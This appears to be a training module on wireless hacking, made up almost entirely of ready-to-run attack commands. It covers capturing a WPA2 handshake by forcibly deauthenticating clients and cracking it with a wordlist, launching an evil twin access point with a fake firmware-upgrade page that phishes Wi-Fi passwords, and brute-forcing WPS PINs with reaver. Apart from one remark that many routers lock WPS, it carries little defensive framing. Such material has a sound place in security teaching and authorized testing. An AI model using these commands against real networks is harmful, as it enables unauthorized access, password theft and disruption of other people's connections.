# Module 16: Wireless Hacking Examples

## 1. WPA2 4-Way Handshake Capture

This is the standard process for capturing and cracking a WPA2 network password.

**Step 1: Put the wireless interface into Monitor Mode**
```bash
airmon-ng check kill
airmon-ng start wlan0
# Interface is now wlan0mon
```

**Step 2: Discover target networks and BSSIDs**
```bash
airodump-ng wlan0mon
```
*(Identify the target network's BSSID, Channel, and connected Clients).*

**Step 3: Capture packets on the specific AP channel**
```bash
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture_file wlan0mon
```

**Step 4: Force a Deauthentication to capture the handshake**
While airodump-ng is running in Step 3, open a new terminal:
```bash
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```
*(`-0` is deauth, `10` is the number of packets, `-a` is AP MAC, `-c` is Client MAC)*

**Step 5: Crack the captured handshake using a wordlist**
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture_file*.cap
```

## 2. Evil Twin Attack Concept

Creating a rogue Access Point that looks identical to the target network.

**Using tools like Wifiphisher or Fluxion:**
```bash
wifiphisher -aI wlan0mon -jI wlan1
```
*This tool will automatically create an Evil Twin, deauthenticate users from the real network, and present a captive portal (fake login page) asking them for their Wi-Fi password to "upgrade router firmware".*

## 3. WPS Brute-Forcing (Reaver)

If a router has WPS (Wi-Fi Protected Setup) enabled and is vulnerable, you can brute-force the 8-digit PIN.

```bash
# Discover WPS-enabled networks
wash -i wlan0mon

# Brute-force the PIN
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
```
*Note: Many modern routers lock WPS after a few failed attempts to prevent this attack.*
